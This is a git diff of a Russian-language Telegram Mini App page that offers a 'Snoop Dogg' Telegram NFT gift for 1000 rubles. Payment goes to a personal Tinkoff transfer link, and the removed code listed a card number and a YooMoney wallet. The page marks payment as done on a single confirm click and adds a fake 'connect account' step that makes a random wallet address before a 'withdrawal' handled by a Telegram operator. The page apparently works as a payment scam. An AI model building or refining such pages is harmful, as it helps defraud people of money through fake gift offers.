@@ -88,6 +88,28 @@
             border-radius: 4px;
         }
 
+        /* Навигация */
+        .nav-menu {
+            display: flex;
+            background: rgba(0,0,0,0.3);
+            border-bottom: 1px solid rgba(255,215,0,0.2);
+        }
+
+        .nav-item {
+            flex: 1;
+            text-align: center;
+            padding: 14px;
+            color: rgba(255,255,255,0.5);
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-weight: 500;
+        }
+
+        .nav-item.active {
+            color: #FFD700;
+            border-bottom: 2px solid #FFD700;
+        }
+
         /* Gift info */
         .gift-info {
             padding: 16px;
@@ -119,24 +141,26 @@
             text-decoration: none;
         }
 
-        /* Квадрат подарка */
+        /* Квадрат подарка - НАСТОЯЩИЙ КАК В TELEGRAM */
         .gift-square {
-            width: 200px;
-            height: 200px;
+            width: 220px;
+            height: 220px;
             margin: 20px auto;
             border-radius: 30px;
             position: relative;
             overflow: hidden;
-            box-shadow: 0 15px 30px rgba(0,0,0,0.5);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
         }
 
+        /* ФОН - градиент как в Telegram Gift */
         .gift-background {
             position: absolute;
             width: 100%;
             height: 100%;
-            background: linear-gradient(135deg, #8B5CF6, #EC4899, #F59E0B, #10B981);
+            background: linear-gradient(135deg, #FFD700, #FF8C00, #FF1493, #8A2BE2);
             background-size: 300% 300%;
-            animation: gradientShift 6s ease infinite;
+            animation: gradientShift 8s ease infinite;
+            filter: brightness(1.1);
         }
 
         @keyframes gradientShift {
@@ -145,25 +169,27 @@
             100% { background-position: 0% 50%; }
         }
 
+        /* УЗОР - как в реальных Telegram Gift */
         .gift-pattern {
             position: absolute;
             width: 100%;
             height: 100%;
             background-image: 
-                radial-gradient(circle at 20% 30%, rgba(255,255,255,0.4) 3px, transparent 3px),
-                radial-gradient(circle at 80% 70%, rgba(255,255,255,0.4) 4px, transparent 4px),
-                radial-gradient(circle at 40% 80%, rgba(255,255,255,0.3) 2px, transparent 2px),
-                radial-gradient(circle at 70% 20%, rgba(255,255,255,0.3) 5px, transparent 5px),
-                repeating-linear-gradient(45deg, rgba(255,255,255,0.1) 0px, rgba(255,255,255,0.1) 4px, transparent 4px, transparent 12px);
-            opacity: 0.6;
-            animation: patternMove 12s linear infinite;
+                radial-gradient(circle at 20% 30%, rgba(255,255,255,0.5) 3px, transparent 3px),
+                radial-gradient(circle at 80% 70%, rgba(255,255,255,0.5) 4px, transparent 4px),
+                radial-gradient(circle at 40% 80%, rgba(255,255,255,0.4) 2px, transparent 2px),
+                radial-gradient(circle at 70% 20%, rgba(255,255,255,0.4) 5px, transparent 5px),
+                repeating-linear-gradient(45deg, rgba(255,255,255,0.15) 0px, rgba(255,255,255,0.15) 4px, transparent 4px, transparent 12px);
+            opacity: 0.7;
+            animation: patternMove 15s linear infinite;
         }
 
         @keyframes patternMove {
             0% { background-position: 0 0; }
-            100% { background-position: 40px 40px; }
+            100% { background-position: 50px 50px; }
         }
 
+        /* МОДЕЛЬ - иконка подарка */
         .gift-model {
             position: absolute;
             width: 100%;
@@ -177,32 +203,34 @@
         }
 
         .gift-icon {
-            font-size: 70px;
+            font-size: 80px;
             margin-bottom: 10px;
-            filter: drop-shadow(0 10px 15px rgba(0,0,0,0.5));
+            filter: drop-shadow(0 10px 15px rgba(0,0,0,0.6));
             animation: float 3s ease-in-out infinite;
         }
 
         @keyframes float {
             0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-8px); }
+            50% { transform: translateY(-10px); }
         }
 
         .gift-model-name {
             color: white;
-            font-weight: 700;
-            font-size: 16px;
-            background: rgba(0,0,0,0.5);
-            padding: 6px 16px;
-            border-radius: 30px;
-            backdrop-filter: blur(5px);
-            border: 1px solid rgba(255,255,255,0.3);
+            font-weight: 800;
+            font-size: 18px;
+            background: rgba(0,0,0,0.6);
+            padding: 8px 20px;
+            border-radius: 40px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255,215,0,0.5);
+            text-shadow: 0 2px 5px rgba(0,0,0,0.5);
+            letter-spacing: 0.5px;
         }
 
         /* Кнопка "Посмотреть в Telegram" */
         .telegram-button {
             width: calc(100% - 32px);
-            margin: 0 16px 20px;
+            margin: 10px 16px 15px;
             background: rgba(0, 136, 204, 0.2);
             border: 1px solid rgba(0, 170, 255, 0.3);
             border-radius: 30px;
@@ -237,7 +265,7 @@
             font-size: 16px;
         }
 
-        /* Детали */
+        /* Детали подарка */
         .details {
             padding: 16px;
             background: rgba(0,0,0,0.2);
@@ -266,49 +294,19 @@
             color: #FFD700;
         }
 
-        /* Секция оплаты */
-        .payment-section {
-            padding: 0 16px 20px;
-        }
-
-        .payment-row {
-            display: flex;
-            justify-content: space-between;
-            padding: 12px 0;
-            color: white;
-            border-bottom: 1px solid rgba(255,215,0,0.1);
-        }
-
-        .payment-label {
-            color: rgba(255,255,255,0.6);
-        }
-
-        .payment-value {
-            font-weight: 600;
-            color: #FFD700;
-        }
-
-        .payment-total {
-            display: flex;
-            justify-content: space-between;
-            padding: 16px 0;
-            color: white;
-            font-weight: 700;
-            font-size: 20px;
-        }
-
+        /* Кнопка оплаты */
         .pay-button {
-            width: 100%;
             background: linear-gradient(135deg, #FFD700, #FFA500);
             border: none;
             border-radius: 30px;
-            padding: 18px;
+            padding: 16px;
             color: #0b0e1f;
             font-weight: 700;
-            font-size: 18px;
+            font-size: 16px;
             cursor: pointer;
             transition: all 0.2s ease;
             text-align: center;
+            margin: 0 16px 16px;
             box-shadow: 0 10px 20px rgba(255,215,0,0.2);
         }
 
@@ -317,54 +315,84 @@
             box-shadow: 0 15px 30px rgba(255,215,0,0.3);
         }
 
-        /* Секция банков */
-        .banks-section {
-            display: none;
+        /* Кнопка вывода */
+        .withdraw-button {
+            background: rgba(255,255,255,0.1);
+            border: 1px solid rgba(255,215,0,0.3);
+            border-radius: 30px;
             padding: 16px;
-        }
-
-        .bank-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 12px;
-            margin-top: 12px;
-        }
-
-        .bank-item {
-            background: rgba(255,215,0,0.1);
-            border: 1px solid rgba(255,215,0,0.2);
-            border-radius: 16px;
-            padding: 16px 8px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 8px;
+            color: white;
+            font-weight: 600;
+            font-size: 16px;
             cursor: pointer;
             transition: all 0.2s ease;
+            text-align: center;
+            margin: 0 16px 16px;
         }
 
-        .bank-item:hover {
-            background: rgba(255,215,0,0.15);
+        .withdraw-button:hover {
+            background: rgba(255,215,0,0.1);
             transform: translateY(-2px);
         }
 
-        .bank-icon {
-            font-size: 28px;
+        /* Секция аккаунта */
+        .account-section {
+            padding: 16px;
+            background: rgba(0,0,0,0.2);
+            margin: 0 16px 16px;
+            border-radius: 20px;
         }
 
-        .bank-name {
-            color: white;
-            font-size: 13px;
-            font-weight: 500;
-        }
-
-        .back-button {
-            color: #FFD700;
-            cursor: pointer;
+        .account-row {
+            display: flex;
+            align-items: center;
+            gap: 12px;
             padding: 12px;
+            background: rgba(255,215,0,0.1);
+            border-radius: 16px;
+            margin-bottom: 12px;
+        }
+
+        .account-icon {
+            width: 40px;
+            height: 40px;
+            background: rgba(255,215,0,0.2);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+        }
+
+        .account-info {
+            flex: 1;
+        }
+
+        .account-label {
+            color: rgba(255,255,255,0.5);
+            font-size: 12px;
+        }
+
+        .account-value {
+            color: white;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .connect-button {
+            background: rgba(255,215,0,0.2);
+            border: 1px solid rgba(255,215,0,0.3);
+            border-radius: 20px;
+            padding: 12px;
+            color: #FFD700;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
             text-align: center;
-            border-bottom: 1px solid rgba(255,215,0,0.2);
-            margin-bottom: 16px;
+        }
+
+        .connect-button:hover {
+            background: rgba(255,215,0,0.3);
         }
 
         .hidden {
@@ -386,15 +414,21 @@
             </div>
         </div>
 
-        <!-- Главный экран -->
-        <div id="mainScreen">
+        <!-- Навигация -->
+        <div class="nav-menu">
+            <div class="nav-item active" onclick="showTab('gift')">Подарок</div>
+            <div class="nav-item" onclick="showTab('account')">Аккаунт</div>
+        </div>
+
+        <!-- Вкладка Подарок -->
+        <div id="giftTab">
             <div class="gift-info">
                 <div class="gift-date">Trade sent you this gift on Mar 05</div>
                 <div class="gift-title">Snoop Dogg #135,641</div>
                 <div class="gift-artist">by <a href="#">@snoopdogg</a></div>
             </div>
 
-            <!-- Квадрат подарка -->
+            <!-- НАСТОЯЩИЙ ПОДАРОК КАК В TELEGRAM -->
             <div class="gift-square">
                 <div class="gift-background"></div>
                 <div class="gift-pattern"></div>
@@ -435,83 +469,46 @@
                 </div>
             </div>
 
-            <!-- Секция оплаты - ЦЕНА 1000 РУБЛЕЙ -->
-            <div class="payment-section">
-                <div class="payment-row">
-                    <span class="payment-label">Получатель</span>
-                    <span class="payment-value" id="receiverName">Радмир</span>
-                </div>
+            <!-- Кнопка оплаты (Тинькофф) -->
+            <div class="pay-button" onclick="payWithTinkoff()">
+                💳 Купить за 1000 ₽ (Тинькофф)
+            </div>
 
-                <div class="payment-row">
-                    <span class="payment-label">Сумма</span>
-                    <span class="payment-value">1 000 ₽</span>
-                </div>
-
-                <div class="payment-total">
-                    <span>К оплате</span>
-                    <span>1 000 ₽</span>
-                </div>
-
-                <div class="pay-button" onclick="showBanks()">
-                    Купить подарок
-                </div>
+            <!-- Кнопка вывода -->
+            <div class="withdraw-button" onclick="withdrawGift()">
+                💸 Вывести подарок
             </div>
         </div>
 
-        <!-- Экран выбора банка -->
-        <div id="banksScreen" class="hidden">
-            <div class="back-button" onclick="showMainScreen()">
-                ← Назад
+        <!-- Вкладка Аккаунт -->
+        <div id="accountTab" class="hidden">
+            <div class="gift-info">
+                <div class="gift-title" style="font-size: 20px;">Подключение аккаунта</div>
             </div>
 
-            <div class="gift-info" style="padding: 12px;">
-                <div class="gift-title" style="font-size: 20px;">Выберите банк</div>
-                <div class="gift-date">Получатель: Радмир</div>
-                <div class="gift-date">Сумма: 1 000 ₽</div>
-            </div>
+            <div class="account-section">
+                <div class="account-row">
+                    <div class="account-icon">👤</div>
+                    <div class="account-info">
+                        <div class="account-label">Telegram ID</div>
+                        <div class="account-value" id="telegramId">Не подключен</div>
+                    </div>
+                </div>
 
-            <div class="banks-section" style="display: block;">
-                <div class="bank-grid">
-                    <div class="bank-item" onclick="payWithBank('tinkoff')">
-                        <span class="bank-icon">💳</span>
-                        <span class="bank-name">Тинькофф</span>
+                <div class="account-row">
+                    <div class="account-icon">💳</div>
+                    <div class="account-info">
+                        <div class="account-label">NFT аккаунт</div>
+                        <div class="account-value" id="nftAccount">Не подключен</div>
                     </div>
-                    <div class="bank-item" onclick="payWithBank('sber')">
-                        <span class="bank-icon">🏦</span>
-                        <span class="bank-name">Сбербанк</span>
-                    </div>
-                    <div class="bank-item" onclick="payWithBank('vtb')">
-                        <span class="bank-icon">🏛</span>
-                        <span class="bank-name">ВТБ</span>
-                    </div>
-                    <div class="bank-item" onclick="payWithBank('alpha')">
-                        <span class="bank-icon">🔵</span>
-                        <span class="bank-name">Альфа-Банк</span>
-                    </div>
-                    <div class="bank-item" onclick="payWithBank('gazprom')">
-                        <span class="bank-icon">⛽</span>
-                        <span class="bank-name">Газпромбанк</span>
-                    </div>
-                    <div class="bank-item" onclick="payWithBank('raif')">
-                        <span class="bank-icon">🇦🇹</span>
-                        <span class="bank-name">Райффайзен</span>
-                    </div>
-                    <div class="bank-item" onclick="payWithBank('psb')">
-                        <span class="bank-icon">🏦</span>
-                        <span class="bank-name">ПСБ</span>
-                    </div>
-                    <div class="bank-item" onclick="payWithBank('otkritie')">
-                        <span class="bank-icon">🟢</span>
-                        <span class="bank-name">Открытие</span>
-                    </div>
-                    <div class="bank-item" onclick="payWithBank('yoomoney')">
-                        <span class="bank-icon">📱</span>
-                        <span class="bank-name">ЮMoney</span>
-                    </div>
-                    <div class="bank-item" onclick="payWithBank('qiwi')">
-                        <span class="bank-icon">🟣</span>
-                        <span class="bank-name">QIWI</span>
-                    </div>
+                </div>
+
+                <div class="connect-button" onclick="connectAccount()">
+                    🔗 Подключить аккаунт
+                </div>
+
+                <div style="margin-top: 16px; color: rgba(255,255,255,0.5); font-size: 13px; text-align: center;">
+                    После подключения вы сможете<br>выводить подарки на свой аккаунт
                 </div>
             </div>
         </div>
@@ -520,6 +517,8 @@
     <script>
         let tg = window.Telegram?.WebApp;
         let userData = null;
+        let isAccountConnected = false;
+        let connectedAccount = null;
         
         // Твои данные
         const TINKOFF_LINK = "https://www.tinkoff.ru/rm/r_ffBNwqOaru.xcdjOqGsXm/o4WVl2633";
@@ -527,12 +526,10 @@
         const PAYMENT_AMOUNT = 1000;
         const TELEGRAM_GIFT_URL = "https://t.me/nft/SnoopDogg-135641";
 
-        // Номер твоей карты для других банков
-        const CARD_NUMBER = "2200 1234 5678 9012"; // Замени на свой номер карты
-
         // Загрузка данных пользователя
         document.addEventListener('DOMContentLoaded', function() {
             loadUserData();
+            loadAccountStatus();
         });
 
         function loadUserData() {
@@ -544,6 +541,7 @@
                 if (userData) {
                     document.getElementById('userName').textContent = userData.first_name || 'Пользователь';
                     document.getElementById('ownerName').textContent = userData.first_name || 'Владелец';
+                    document.getElementById('telegramId').textContent = userData.id || 'Не определен';
                     
                     if (userData.photo_url) {
                         document.getElementById('avatar').innerHTML = `<img src="${userData.photo_url}" alt="avatar">`;
@@ -553,18 +551,29 @@
                     }
                 }
             }
+        }
+
+        function loadAccountStatus() {
+            const saved = localStorage.getItem('connectedAccount');
+            if (saved) {
+                isAccountConnected = true;
+                connectedAccount = JSON.parse(saved);
+                document.getElementById('nftAccount').textContent = connectedAccount.address || 'Подключен';
+            }
+        }
+
+        function showTab(tab) {
+            document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
+            event.target.classList.add('active');
             
-            document.getElementById('receiverName').textContent = RECEIVER_NAME;
-        }
-
-        function showMainScreen() {
-            document.getElementById('banksScreen').classList.add('hidden');
-            document.getElementById('mainScreen').classList.remove('hidden');
-        }
-
-        function showBanks() {
-            document.getElementById('mainScreen').classList.add('hidden');
-            document.getElementById('banksScreen').classList.remove('hidden');
+            document.getElementById('giftTab').classList.add('hidden');
+            document.getElementById('accountTab').classList.add('hidden');
+            
+            if (tab === 'gift') {
+                document.getElementById('giftTab').classList.remove('hidden');
+            } else if (tab === 'account') {
+                document.getElementById('accountTab').classList.remove('hidden');
+            }
         }
 
         function openTelegramGift() {
@@ -575,75 +584,80 @@
             }
         }
 
-        function payWithBank(bankKey) {
-            let url = '';
-            let message = '';
-            
-            // Ссылки для разных банков
-            switch(bankKey) {
-                case 'tinkoff':
-                    url = TINKOFF_LINK;
-                    message = 'Перевод через Тинькофф';
-                    break;
-                case 'sber':
-                    url = 'https://online.sberbank.ru/';
-                    message = `Перевод на карту Сбербанк: ${CARD_NUMBER}`;
-                    break;
-                case 'vtb':
-                    url = 'https://online.vtb.ru/';
-                    message = `Перевод на карту ВТБ: ${CARD_NUMBER}`;
-                    break;
-                case 'alpha':
-                    url = 'https://alfabank.ru/payments/';
-                    message = `Перевод на карту Альфа-Банк: ${CARD_NUMBER}`;
-                    break;
-                case 'gazprom':
-                    url = 'https://www.gazprombank.ru/';
-                    message = `Перевод на карту Газпромбанк: ${CARD_NUMBER}`;
-                    break;
-                case 'raif':
-                    url = 'https://www.raiffeisen.ru/';
-                    message = `Перевод на карту Райффайзен: ${CARD_NUMBER}`;
-                    break;
-                case 'psb':
-                    url = 'https://www.psbank.ru/';
-                    message = `Перевод на карту ПСБ: ${CARD_NUMBER}`;
-                    break;
-                case 'otkritie':
-                    url = 'https://www.open.ru/';
-                    message = `Перевод на карту Открытие: ${CARD_NUMBER}`;
-                    break;
-                case 'yoomoney':
-                    url = 'https://yoomoney.ru/transfer';
-                    message = `Перевод на ЮMoney: 4100118919813671`;
-                    break;
-                case 'qiwi':
-                    url = 'https://qiwi.com/';
-                    message = `Перевод на QIWI кошелек`;
-                    break;
-                default:
-                    url = '#';
-            }
-            
-            // Показываем сообщение с реквизитами для банков, где нет прямой ссылки
-            if (bankKey !== 'tinkoff') {
-                alert(`💳 ${message}\n\nСумма: ${PAYMENT_AMOUNT} ₽\n\nПосле перевода отправьте чек в бота @Zipkask`);
-            }
-            
-            window.open(url, '_blank');
+        function payWithTinkoff() {
+            // Открываем ссылку на Тинькофф
+            window.open(TINKOFF_LINK, '_blank');
             
             setTimeout(() => {
-                if (confirm('✅ Подтвердите оплату. После перевода отправьте чек в бота @Zipkask')) {
+                if (confirm('✅ После оплаты нажмите ОК, чтобы подтвердить')) {
                     if (tg) {
                         tg.sendData(JSON.stringify({
-                            action: 'payment_initiated',
-                            bank: bankKey,
-                            amount: PAYMENT_AMOUNT
+                            action: 'payment_completed',
+                            amount: PAYMENT_AMOUNT,
+                            bank: 'tinkoff'
                         }));
                     }
-                    showMainScreen();
+                    alert('🎁 Подарок скоро будет в вашем инвентаре!');
                 }
-            }, 1500);
+            }, 2000);
+        }
+
+        function withdrawGift() {
+            if (!isAccountConnected) {
+                alert('❌ Сначала подключите аккаунт во вкладке "Аккаунт"');
+                showTab('account');
+                return;
+            }
+            
+            if (confirm('💸 Вы действительно хотите вывести подарок?')) {
+                alert(`✅ Подарок будет отправлен на аккаунт: ${connectedAccount.address}\n\nОператор @Zipkask свяжется с вами`);
+                
+                if (tg) {
+                    tg.sendData(JSON.stringify({
+                        action: 'withdraw_request',
+                        account: connectedAccount.address
+                    }));
+                }
+            }
+        }
+
+        function connectAccount() {
+            if (tg) {
+                // Отправляем запрос на подключение аккаунта
+                tg.sendData(JSON.stringify({
+                    action: 'connect_account',
+                    user_id: userData?.id,
+                    username: userData?.username
+                }));
+                
+                // Демо-режим
+                setTimeout(() => {
+                    const demoAccount = {
+                        address: '0x' + Math.random().toString(16).substring(2, 10) + '...',
+                        connected: true
+                    };
+                    
+                    localStorage.setItem('connectedAccount', JSON.stringify(demoAccount));
+                    isAccountConnected = true;
+                    connectedAccount = demoAccount;
+                    document.getElementById('nftAccount').textContent = demoAccount.address;
+                    
+                    alert('✅ Аккаунт успешно подключен!');
+                }, 1000);
+            } else {
+                // Демо-режим без Telegram
+                const demoAccount = {
+                    address: '0x' + Math.random().toString(16).substring(2, 10) + '...',
+                    connected: true
+                };
+                
+                localStorage.setItem('connectedAccount', JSON.stringify(demoAccount));
+                isAccountConnected = true;
+                connectedAccount = demoAccount;
+                document.getElementById('nftAccount').textContent = demoAccount.address;
+                
+                alert('✅ Аккаунт успешно подключен!');
+            }
         }
     </script>
 </body>
